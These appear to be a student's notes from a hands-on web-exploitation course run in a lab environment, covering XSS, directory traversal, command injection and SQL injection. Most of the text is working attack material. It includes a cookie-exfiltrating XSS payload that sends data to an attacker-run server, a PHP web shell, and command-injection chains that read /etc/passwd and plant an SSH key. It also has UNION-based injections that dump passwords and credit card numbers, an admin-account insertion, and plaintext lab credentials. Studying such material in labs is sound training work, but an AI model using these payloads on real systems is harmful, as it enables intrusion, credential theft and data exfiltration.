# Stack Info
```
--Stack Number
  5

--Username
CODA-503-M

--Password
Gx1LjlSgOgQJJMy

Boxes
Student - Password
--Linux ops
10.50.31.135
 
--Windows
10.50.24.133

--Jump
10.50.27.155

--Password
Gx1LjlSgOgQJJMy

--CTFd
http://10.50.20.30:8000/resources
```
# Day 1 - XSS
## Enumeration
```
    Robots.txt

    Legitimate surfing

    Tools:

        NSE scripts

        Nikto
```
## Reflected XSS
```
    Most common form of XSS

    Transient, occurs in error messages or search results

    Delivered through intermediate media, such as a link in an email

    Characters that are normally illegal in URLs can be Base64 encoded


Below is what you see, but the server will decode as name=abc123


http://example.com/page.php?name=dXNlcjEyMw
```
## Stored XSS
```
    Resides on vulnerable site

    Only requires user to visit page


<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
```
## Useful JavaScript Components
```
Proof of vulnerability to xss (simple alert):

<script>alert('XSS');</script>

    Capturing Cookies
    document.cookie

    Capturing Keystrokes

        bind keydown and keyup

    Capturing Sensitive Data
    document.body.innerHTML
```
## More Stored XSS 
```
On Box
python3 -m http.server

On Website
<script>document.location="http://x.x.x.x:8000/"+document.cookie;</script>
```
## Server-Side injection
```
Directory Traversal/Path Traversal


    Ability to read/execute outside web server’s directory

    Uses ../../ (relative paths) in manipulating a server-side file path


view_image.php?file=../../etc/passwd
```
## Malicious File Upload
in the near future there may be a time when you can upload a file but it will be uploaded somewhere seperate. ** MUST be able to upload AND call your file
```
<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```
## Command Injection
```
Application on the server is vulnerable,
allowing execution of arbitrary commands

    User input not validated
        Common example is a SOHO router, with a web page to allow ping

Might contain the following in it’s code:
system("ping -c 1 ".$_GET["ip"]);


Run the following to chain/stack our arbitrary command
; cat /etc/passwd
```

## Upload publickey 
```
ssh keys stored in /etc/ssh
ssh-keygen -t rsa -b 4096
cat .ssh/id_rsa
cat .ssh/id_rsa.pub

; ls -lisa /var/www/
; mkdir /var/www/.ssh
; ls -lisa /var/www/.ssh
; echo "your_public_key_here" >> /var/www/.ssh/authorized_keys

ssh -i .ssh/id_rsa www-data@x.x.x.x
```
# Notes
```
ssh -MS /tmp/jump student@10.50.27.155
  2 ssh -S /tmp/jump dummy -O forward -D 9050
  3 proxychains nmap -T4 10.100.28.40 --script=http-enum
  4 
  5 ssh -S /tmp/jump dummy -O forward -L 1111:10.100.28.40:80
  6 firefox localhost:1111
  7 
  8 uploaded webshell.php
  9 
 10 ssh -S /tmp/jump dummy -O forward -L 4041:10.100.28.40:4444
 11 proxychains ssh -i .ssh/id_rsa billybob@10.100.28.40 -p 4444
 12 
 13 ssh -MS /tmp/t1 billybob@127.0.0.1 -p 4041
 14 ssh -S /tmp/t1 fug -O forward -L 6767:10.100.28.55:22
 15 ssh -S /tmp/t1 fug -O forward -D 9050
 16 firefox localhost:6999
 17 
 18 inspect element on the websit and check functions
 19 call the function in the console
 20 
 21 Directory Traversal, use GET or POST methond
 22 eg., http://localhost:6999/books_pick.php?book=
 23 Use ../../../../etc/passwd
```



# Day 2 WEB EXPLOIT
## SQL Injection
### Standard Commands
```
** SELECT
Extracts data from a database

** UNION
Used to combine the result-set of two or more SELECT statements

USE
Selects the DB to use

UPDATE
Updates data in a database

DELETE
Deletes data from a database

INSERT INTO
Inserts new data into a database

CREATE DATABASE
Creates a new database

ALTER DATABASE
Modifies a database

CREATE TABLE
Creates a new table

ALTER TABLE
Modifies a table

DROP TABLE
Deletes a table

CREATE INDEX
Creates an index (search key)

DROP INDEX
Deletes an index
```

## Practice Notes 
```
mysql
show databases;
^--> three defaults (info,mysql,performance)

SHOW tables FROM session;
Tires <---
car
session_log
user
userinfo

SHOW columns FROM session.Tires
SELECT tireid,name,size,cost FROM session.Tires;

SHOW columns from session.car
SELECT tireid,name,size,cost FROM session.Tires UNION SELECT carid,name,color,cost FROM session.car;
```

## Unsanitized Fields
```
Unsanitized: input fields can be found using a Single Quote ⇒ '
    Will return extraneous information
    ' closes a variable, to allow for additional statements/clauses

Example - Injecting Your Statement
User enters tom' OR 1='1 in the name and pass fields.

Truth Statement: tom ' OR 1='1

Server-Side query executed would appear like this:

SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=' OR 1='1’

Dev Console 
Network
POST 
Request
Raw
Copy and Paste in URL adding ?
```

## SQL POST METHOD
```
SQL POST METHOD
1) Identify Vulnerable Field
--> Audi' OR 1='1

2) Identify Columns
Audi' UNION SELECT 1,2,3,4,5 #

3) Craft Golden Statement - DUMPS ALL Info about Database
Audi' UNION SELECT table_schema,2,table_name,column_name, FROM information_schema.columns #
ANNOTATE DATA DUMPED

Audi' UNION SELECT <column>,<column>,<column>,<column> FROM database.table

4) Craft Query
Audi' UNION SELECT studentID,2,username,passwd,5 FROM session.userinfo  #
Audi' UNION SELECT 1,2,name,pass,5 FROM session.user #
Audi' UNION SELECT carid,2,type,4,5 FROM session.car
```

## SQL GET METHOD
```
1) Find Vulnerable Field
Go to each field
?Selection=1 OR 1=1
?Selection=2 OR 1=1 <-- Vulnerable

2) Identify Columns
?Selection=2 UNION SELECT 1,2,3

3) Craft Golden statement - DUMPS ALL INFO 
?selection=1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns

4) Craft Query
?Selection=2 UNION SELECT name,pass,3 FROM session.user
?Selection=2 UNION SELECT name,pass,@@version FROM session.user
```

# DAY 2 
```
ssh -MS /tmp/jump student@10.50.27.155
  2 LINOPS ssh -S /tmp/jump dummy -O forward -D 9050
  3 LINOPS proxychains nmap 10.100.28.48 --script=http-enum
  4 
  5 ssh -S /tmp/jump /dummy -O foward -L 6161:10.100.28.48:80
  6 firefox localhost:6161
  7 
  8 Found a search box that takes input
  9 ' OR 1='1
 10 
 11 Navigated to products by category and performed SQL Injection POST METHOD
 12 productsCategory.php?category=1 UNION SELECT username,password,id FROM sqli    njection.members
 13 
 14 Identified vulnerability in sqlinjection.products
 15 productsCategory.php?category=1 UNION SELECT id,name,description FROM sqlin    jection.products
 16 
 17 Identified Credit Card Flag
 18 productsCategory.php?category=1 UNION SELECT id,creditcard_number,3 FROM sq    linjection.payments
 19 
 20 Identified Flag
 21 /cases/productsCategory.php?category=1 UNION SELECT data,2,id FROM sqlinjec    tion.share4
 22 
 23 Create an Admin User named Hacker
 24 Hacker', 'Hacker', 'Hacker', 1 )  #
```
